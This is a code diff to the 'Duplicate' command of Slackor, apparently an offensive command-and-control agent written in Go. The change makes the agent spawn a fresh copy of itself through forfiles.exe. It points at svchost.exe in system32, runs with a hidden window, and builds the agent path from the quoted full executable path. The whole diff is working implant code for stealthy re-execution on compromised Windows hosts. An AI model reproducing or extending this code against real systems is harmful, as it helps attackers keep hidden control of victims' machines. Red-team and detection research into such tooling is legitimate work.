@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"syscall"
 
 	"github.com/n00py/Slackor/pkg/command"
@@ -23,19 +24,27 @@ func (d Duplicate) Name() string {
 // Run spawns a new agent using forfiles.exe
 func (d Duplicate) Run(clientID string, jobID string, args []string) (string, error) {
 	cmdName := "forfiles.exe"
+	ex, err := os.Executable()
+	if err != nil {
+		panic(err)
+	}
+	exPath := filepath.Dir(ex)
+	exName := filepath.Base(os.Args[0])
+	exAgent := ("\"" + exPath + "\\" + exName + "\"")
+
 	cmd := exec.Command(cmdName)
-	cmdArgs := []string{"/p", `c:\windows\system32`, "/m", "svchost.exe", "/c", os.Args[0]}
+	cmdArgs := []string{"/p", `c:\windows\system32`, "/m", "svchost.exe", "/c", exAgent}
 	cmd = exec.Command(cmdName, cmdArgs...)
 	var out bytes.Buffer
 	var stderr bytes.Buffer
 	cmd.Stdout = &out
 	cmd.Stderr = &stderr
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	err := cmd.Run()
+	err = cmd.Run()
 	if err != nil {
 		return "", err
 	}
-	return fmt.Sprintf("Duplicated %s.", os.Args[0]), nil
+	return fmt.Sprintf("Duplicated %s.", exAgent), nil
 }
 
 func init() {
